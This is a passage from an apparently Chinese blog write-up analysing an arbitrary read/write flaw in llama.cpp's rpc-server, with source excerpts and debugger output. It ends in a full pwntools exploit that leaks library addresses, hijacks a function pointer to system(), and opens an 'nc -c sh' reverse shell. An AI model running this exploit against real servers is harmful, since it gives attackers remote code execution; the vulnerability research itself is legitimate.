class="built_in">find</span>(result-&gt;buffer) == buffers.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result-&gt;op = (ggml_op) tensor-&gt;op;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; GGML_MAX_OP_PARAMS / <span class="built_in">sizeof</span>(<span class="type">int32_t</span>); i++) &#123;</span><br><span class="line">        result-&gt;op_params[i] = tensor-&gt;op_params[i];</span><br><span class="line">    &#125;</span><br><span class="line">    result-&gt;flags = tensor-&gt;flags;</span><br><span class="line">    result-&gt;data = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> *&gt;(tensor-&gt;data);</span><br><span class="line">    <span class="built_in">ggml_set_name</span>(result, tensor-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么 buffers 中的元素是怎么来的？在 <code>rpc_server::alloc_buffer</code> 中会根据 size 申请一个 buffer 插入到 buffers 集合里。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">rpc_server::alloc_buffer</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; input, std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; output)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// input serialization format: | size (8 bytes) |</span></span><br><span class="line">    <span class="keyword">if</span> (input.<span class="built_in">size</span>() != <span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;size, input.<span class="built_in">data</span>(), <span class="built_in">sizeof</span>(size));</span><br><span class="line">    <span class="type">ggml_backend_buffer_type_t</span> buft = <span class="built_in">ggml_backend_get_default_buffer_type</span>(backend);</span><br><span class="line">    <span class="type">ggml_backend_buffer_t</span> buffer = <span class="built_in">ggml_backend_buft_alloc_buffer</span>(buft, size);</span><br><span class="line">    <span class="type">uint64_t</span> remote_ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> remote_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (buffer != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        remote_ptr = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint64_t</span>&gt;(buffer);</span><br><span class="line">        remote_size = buffer-&gt;size;</span><br><span class="line">        <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] size: %&quot;</span> PRIu64 <span class="string">&quot; -&gt; remote_ptr: %&quot;</span> PRIx64 <span class="string">&quot;, remote_size: %&quot;</span> PRIu64 <span class="string">&quot;\n&quot;</span>, __func__, size, remote_ptr, remote_size);</span><br><span class="line">        buffers.<span class="built_in">insert</span>(buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] size: %&quot;</span> PRIu64 <span class="string">&quot; -&gt; failed\n&quot;</span>, __func__, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// output serialization format: | remote_ptr (8 bytes) | remote_size (8 bytes) |</span></span><br><span class="line">    output.<span class="built_in">resize</span>(<span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(output.<span class="built_in">data</span>(), &amp;remote_ptr, <span class="built_in">sizeof</span>(remote_ptr));</span><br><span class="line">    <span class="built_in">memcpy</span>(output.<span class="built_in">data</span>() + <span class="built_in">sizeof</span>(<span class="type">uint64_t</span>), &amp;remote_size, <span class="built_in">sizeof</span>(remote_size));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ggml-backend-tensor-get"><a href="#ggml-backend-tensor-get" class="headerlink" title="ggml_backend_tensor_get"></a>ggml_backend_tensor_get</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GGML_CALL <span class="type">void</span> <span class="title">ggml_backend_tensor_get</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> ggml_tensor * tensor, <span class="type">void</span> * data, <span class="type">size_t</span> offset, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">ggml_backend_buffer_t</span> buf = tensor-&gt;view_src ? tensor-&gt;view_src-&gt;buffer : tensor-&gt;buffer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GGML_ASSERT</span>(buf != <span class="literal">NULL</span> &amp;&amp; <span class="string">&quot;tensor buffer not set&quot;</span>);</span><br><span class="line">    <span class="built_in">GGML_ASSERT</span>(tensor-&gt;data != <span class="literal">NULL</span> &amp;&amp; <span class="string">&quot;tensor not allocated&quot;</span>);</span><br><span class="line">    <span class="built_in">GGML_ASSERT</span>(offset + size &lt;= <span class="built_in">ggml_nbytes</span>(tensor) &amp;&amp; <span class="string">&quot;tensor read out of bounds&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!size) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf-&gt;iface.<span class="built_in">get_tensor</span>(buf, tensor, data, offset, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">GGML_CALL <span class="type">static</span> <span class="type">void</span> <span class="title">ggml_backend_cpu_buffer_get_tensor</span><span class="params">(<span class="type">ggml_backend_buffer_t</span> buffer, <span class="type">const</span> <span class="keyword">struct</span> ggml_tensor * tensor, <span class="type">void</span> * data, <span class="type">size_t</span> offset, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(data, (<span class="type">const</span> <span class="type">char</span> *)tensor-&gt;data + offset, size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GGML_UNUSED</span>(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只对 <code>offset + size &lt;= ggml_nbytes(tensor)</code> 进行了检测，然后就调用了 <code>buf-&gt;iface.get_tensor</code> 拷贝数据。完全没有考虑 data 和 buffer 字段是否合法性。所以我们只要构造一个能通过检查的 buffer 字段，修改 data 就能实现任意地址读写了。</p><p>作者在这里直接告诉了我们 <code>buf-&gt;iface.set_tensor</code> 执行的是 <code>ggml_backend_cpu_buffer_get_tensor</code> 函数，那 iface 又是怎么分配的？让我们回到 <code>rpc_server::alloc_buffer</code>，可以看到调用了 <code>ggml_backend_get_default_buffer_type</code> 获取默认的 buft，然后后执行 <code>ggml_backend_buft_alloc_buffer</code> 分配 buffer。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ggml_backend_buffer_type_t</span> buft = <span class="built_in">ggml_backend_get_default_buffer_type</span>(backend);</span><br><span class="line"><span class="type">ggml_backend_buffer_t</span> buffer = <span class="built_in">ggml_backend_buft_alloc_buffer</span>(buft, size);</span><br></pre></td></tr></table></figure><p>ggml_backend_get_default_buffer_type 会返回一个静态的 ggml_backend_buffer_type 结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GGML_CALL <span class="type">ggml_backend_buffer_type_t</span> <span class="title">ggml_backend_cpu_buffer_type</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">ggml_backend_buffer_type</span> ggml_backend_cpu_buffer_type = &#123;</span><br><span class="line">        <span class="comment">/* .iface = */</span> &#123;</span><br><span class="line">            <span class="comment">/* .get_name         = */</span> ggml_backend_cpu_buffer_type_get_name,</span><br><span class="line">            <span class="comment">/* .alloc_buffer     = */</span> ggml_backend_cpu_buffer_type_alloc_buffer,</span><br><span class="line">            <span class="comment">/* .get_alignment    = */</span> ggml_backend_cpu_buffer_type_get_alignment,</span><br><span class="line">            <span class="comment">/* .get_max_size     = */</span> <span class="literal">NULL</span>, <span class="comment">// defaults to SIZE_MAX</span></span><br><span class="line">            <span class="comment">/* .get_alloc_size   = */</span> <span class="literal">NULL</span>, <span class="comment">// defaults to ggml_nbytes</span></span><br><span class="line">            <span class="comment">/* .is_host          = */</span> ggml_backend_cpu_buffer_type_is_host,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">/* .context = */</span> <span class="literal">NULL</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;ggml_backend_cpu_buffer_type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此 <code>ggml_backend_buft_alloc_buffer</code> 调用的是 <code>ggml_backend_cpu_buffer_type_alloc_buffer</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GGML_CALL <span class="type">ggml_backend_buffer_t</span> <span class="title">ggml_backend_buft_alloc_buffer</span><span class="params">(<span class="type">ggml_backend_buffer_type_t</span> buft, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buft-&gt;iface.<span class="built_in">alloc_buffer</span>(buft, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">GGML_CALL <span class="type">static</span> <span class="type">ggml_backend_buffer_t</span> <span class="title">ggml_backend_cpu_buffer_type_alloc_buffer</span><span class="params">(<span class="type">ggml_backend_buffer_type_t</span> buft, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    size += TENSOR_ALIGNMENT;   <span class="comment">// malloc may return an address that is not aligned</span></span><br><span class="line">    <span class="type">void</span> * data = <span class="built_in">malloc</span>(size); <span class="comment">// <span class="doctag">TODO:</span> use GGML_ALIGNED_MALLOC (move to ggml-impl.h)</span></span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s: failed to allocate buffer of size %zu\n&quot;</span>, __func__, size);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ggml_backend_buffer_init</span>(buft, cpu_backend_buffer_i, data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配 heap 到 data 指针后，通过 ggml_backend_buffer_init 初始化成 ggml_backend_buffer 后返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(*buffer) = (struct ggml_backend_buffer) &#123;</span><br><span class="line">    /* .interface = */ iface,</span><br><span class="line">    /* .buft      = */ buft,</span><br><span class="line">    /* .context   = */ context,</span><br><span class="line">    /* .size      = */ size,</span><br><span class="line">    /* .usage     = */ GGML_BACKEND_BUFFER_USAGE_ANY</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最终的 buffer 结构是这个样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *buffer</span><br><span class="line">$1 = &#123;</span><br><span class="line">  iface = &#123;</span><br><span class="line">    get_name = 0x7f012b105570 &lt;ggml_backend_cpu_buffer_name&gt;,</span><br><span class="line">    free_buffer = 0x7f012b1055d0 &lt;ggml_backend_cpu_buffer_free_buffer&gt;,</span><br><span class="line">    get_base = 0x7f012b105580 &lt;ggml_backend_cpu_buffer_get_base&gt;,</span><br><span class="line">    init_tensor = 0x0,</span><br><span class="line">    set_tensor = 0x7f012b105660 &lt;ggml_backend_cpu_buffer_set_tensor&gt;,</span><br><span class="line">    get_tensor = 0x7f012b105680 &lt;ggml_backend_cpu_buffer_get_tensor&gt;,</span><br><span class="line">    cpy_tensor = 0x7f012b105fd0 &lt;ggml_backend_cpu_buffer_cpy_tensor&gt;,</span><br><span class="line">    clear = 0x7f012b105640 &lt;ggml_backend_cpu_buffer_clear&gt;,</span><br><span class="line">    reset = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  buft = 0x7f012b199ba0 &lt;ggml_backend_cpu_buffer_type&gt;,</span><br><span class="line">  context = 0x555a0cfc0430,</span><br><span class="line">  size = 288,</span><br><span class="line">  usage = GGML_BACKEND_BUFFER_USAGE_ANY</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *buffer.buft</span><br><span class="line">$2 = &#123;</span><br><span class="line">  iface = &#123;</span><br><span class="line">    get_name = 0x7f012b105bf0 &lt;ggml_backend_cpu_buffer_type_get_name&gt;,</span><br><span class="line">    alloc_buffer = 0x7f012b105d30 &lt;ggml_backend_cpu_buffer_type_alloc_buffer&gt;,</span><br><span class="line">    get_alignment = 0x7f012b1055a0 &lt;ggml_backend_cpu_buffer_type_get_alignment&gt;,</span><br><span class="line">    get_max_size = 0x0,</span><br><span class="line">    get_alloc_size = 0x0,</span><br><span class="line">    is_host = 0x7f012b1055b0 &lt;ggml_backend_cpu_buffer_type_is_host&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  context = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="任意地址写漏洞"><a href="#任意地址写漏洞" class="headerlink" title="任意地址写漏洞"></a>任意地址写漏洞</h3><p>调用的是 <code>rpc_server::set_tensor</code>，成因和任意地址写基本一样，不再赘述。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据前面的分析，我们修改 data 就能实现任意地址读写，并且 alloc_buffer 还贴心给了 buffer 的地址，所以先考虑读 heap 上的内容。看了一圈 heap 中的内容，只能找到 ggml 的地址可以泄露。</p><p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/cbdf4f523325440a022887dd199e20f1.png"></p><p>然后利用 ggml.so 中已经链接到真实地址的 got 表，我们还可以泄露出 libc 地址，然后修改堆上的 <code>buft-&gt;iface</code>，最后通过 <code>BUFFER_CLEAR</code> 触发 system</p><p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/f2239d696b2753882da6db506a2db547.png">​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># nc -lvnp 9001</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&quot;./build/bin/rpc-server&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">ggml_so = ELF(<span class="string">&quot;/share/llama.cpp/llama-b3560/build/ggml/src/libggml.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.binary = binary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALLOC_BUFFER = <span class="number">0</span></span><br><span class="line">GET_ALIGNMENT = <span class="number">1</span></span><br><span class="line">GET_MAX_SIZE = <span class="number">2</span></span><br><span class="line">BUFFER_GET_BASE = <span class="number">3</span></span><br><span class="line">FREE_BUFFER = <span class="number">4</span></span><br><span class="line">BUFFER_CLEAR = <span class="number">5</span></span><br><span class="line">SET_TENSOR = <span class="number">6</span></span><br><span class="line">GET_TENSOR = <span class="number">7</span></span><br><span class="line">COPY_TENSOR = <span class="number">8</span></span><br><span class="line">GRAPH_COMPUTE = <span class="number">9</span></span><br><span class="line">GET_DEVICE_MEMORY = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">io: remote, cmd: <span class="built_in">int</span>, buf: <span class="built_in">bytes</span></span>):</span><br><span class="line">    packet = p8(cmd)         <span class="comment"># cmd, 1 byte</span></span><br><span class="line">    packet += p64(<span class="built_in">len</span>(buf))  <span class="comment"># msg size, 8 bytes</span></span><br><span class="line">    packet += buf            <span class="comment"># content, size of the buffer you want to allocate</span></span><br><span class="line">    io.send(packet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc_buffer</span>(<span class="params">io: remote, size: <span class="built_in">int</span></span>):</span><br><span class="line">    send_cmd(io, ALLOC_BUFFER, p64(size))</span><br><span class="line">    recv = p.recvn(<span class="number">0x8</span> + <span class="number">0x10</span>)</span><br><span class="line">    ptr = u64(recv[<span class="number">0x8</span>:<span class="number">0x10</span>])</span><br><span class="line">    sz = u64(recv[<span class="number">0x10</span>:<span class="number">0x18</span>])</span><br><span class="line">    log.info(<span class="string">f&quot;remote_ptr: <span class="subst">&#123;<span class="built_in">hex</span>(ptr)&#125;</span>, remote_size: <span class="subst">&#123;sz&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ptr, sz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_buffer</span>(<span class="params">io: remote, remote_ptr</span>):</span><br><span class="line">    send_cmd(io, FREE_BUFFER, p64(remote_ptr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_buffer</span>(<span class="params">io: remote, remote_ptr, value=<span class="number">0x00</span></span>):</span><br><span class="line">    send_cmd(io, BUFFER_CLEAR, p64(remote_ptr) + p8(value))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_read</span>(<span class="params">io: remote, valid_buffer_addr: <span class="built_in">int</span>, target_addr: <span class="built_in">int</span>, leak_size: <span class="built_in">int</span></span>):</span><br><span class="line">    rpc_tensor_pd = flat([</span><br><span class="line">        <span class="number">0x1</span>,  <span class="comment"># id</span></span><br><span class="line">        p32(<span class="number">2</span>),  <span class="comment"># type</span></span><br><span class="line">        p64(valid_buffer_addr),  <span class="comment"># buffer</span></span><br><span class="line">        [p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>),],  <span class="comment"># ne</span></span><br><span class="line">        [p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>),],  <span class="comment"># nb</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># op</span></span><br><span class="line">        [p32(<span class="number">0</span>)] * <span class="number">16</span>,  <span class="comment"># op_params (corrected from 8 to 16)</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># flags</span></span><br><span class="line">        [p64(<span class="number">0</span>)] * <span class="number">10</span>,  <span class="comment"># src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_offs</span></span><br><span class="line">        p64(target_addr),  <span class="comment"># data</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * <span class="number">64</span>,  <span class="comment"># name</span></span><br><span class="line">        <span class="string">&#x27;x&#x27;</span> * <span class="number">4</span>  <span class="comment"># padding</span></span><br><span class="line">    ])</span><br><span class="line">    content = rpc_tensor_pd</span><br><span class="line">    content += p64(<span class="number">0</span>)  <span class="comment"># offset</span></span><br><span class="line">    content += p64(leak_size)  <span class="comment"># size</span></span><br><span class="line">    send_cmd(io, GET_TENSOR, content)</span><br><span class="line">    size = u64(p.recv(<span class="number">0x8</span>))</span><br><span class="line">    <span class="keyword">return</span> p.recv(size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">io: remote, valid_buffer_addr: <span class="built_in">int</span>, target_addr: <span class="built_in">int</span>, data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    rpc_tensor_pd = flat([</span><br><span class="line">        <span class="number">0x1</span>,  <span class="comment"># id</span></span><br><span class="line">        p32(<span class="number">2</span>),  <span class="comment"># type</span></span><br><span class="line">        p64(valid_buffer_addr),  <span class="comment"># buffer</span></span><br><span class="line">        [p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>), p32(<span class="number">0xdeadbeef</span>),],  <span class="comment"># ne</span></span><br><span class="line">        [p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>), p32(<span class="number">1</span>),],  <span class="comment"># nb</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># op</span></span><br><span class="line">        [p32(<span class="number">0</span>)] * <span class="number">16</span>,  <span class="comment"># op_params (corrected from 8 to 16)</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># flags</span></span><br><span class="line">        [p64(<span class="number">0</span>)] * <span class="number">10</span>,  <span class="comment"># src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_src</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># view_offs</span></span><br><span class="line">        p64(target_addr),  <span class="comment"># data</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * <span class="number">64</span>,  <span class="comment"># name</span></span><br><span class="line">        <span class="string">&#x27;x&#x27;</span> * <span class="number">4</span>  <span class="comment"># padding</span></span><br><span class="line">    ])</span><br><span class="line">    content = rpc_tensor_pd</span><br><span class="line">    content += p64(<span class="number">0</span>)  <span class="comment"># offset</span></span><br><span class="line">    content += data</span><br><span class="line">    send_cmd(io, SET_TENSOR, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">50052</span>)</span><br><span class="line">remote_ptr, _ = alloc_buffer(p, <span class="number">0x100</span>)</span><br><span class="line">buffer_ptr = remote_ptr + (<span class="number">0xf0</span> - <span class="number">0x60</span>)</span><br><span class="line">leak_addr = remote_ptr + <span class="number">0x80</span></span><br><span class="line">log.info(<span class="string">f&quot;buffer_ptr: <span class="subst">&#123;<span class="built_in">hex</span>(buffer_ptr)&#125;</span>&quot;</span>)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">50052</span>)</span><br><span class="line">remote_ptr, remote_size = alloc_buffer(p, <span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># leak ggml base</span></span><br><span class="line">recv = arb_read(p, buffer_ptr, leak_addr, <span class="number">0x100</span>)</span><br><span class="line">leak_ggml_addr = u64(recv[<span class="number">0x10</span>:<span class="number">0x18</span>])</span><br><span class="line">ggml_base = leak_ggml_addr - ggml_so.symbols[<span class="string">&quot;ggml_backend_cpu_buffer_name&quot;</span>]</span><br><span class="line">ggml_puts_got = ggml_base + ggml_so.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.info(<span class="string">f&quot;leak_ggml_addr: <span class="subst">&#123;<span class="built_in">hex</span>(leak_ggml_addr)&#125;</span>, ggml_puts_got: <span class="subst">&#123;<span class="built_in">hex</span>(ggml_puts_got)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">recv = arb_read(p, buffer_ptr, ggml_puts_got, <span class="number">0x100</span>)</span><br><span class="line">libc_puts_addr = u64(recv[:<span class="number">0x8</span>])</span><br><span class="line">libc_base = libc_puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.info(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># hijack</span></span><br><span class="line">cmd = flat([</span><br><span class="line">    <span class="string">b&quot;nc -c sh 127.0.0.1 9001&quot;</span>.ljust(<span class="number">0x37</span>, <span class="string">b&quot; &quot;</span>) + <span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">    libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">])</span><br><span class="line">arb_write(p, buffer_ptr, buffer_ptr, cmd)</span><br><span class="line">clear_buffer(p, remote_ptr)</span><br><span 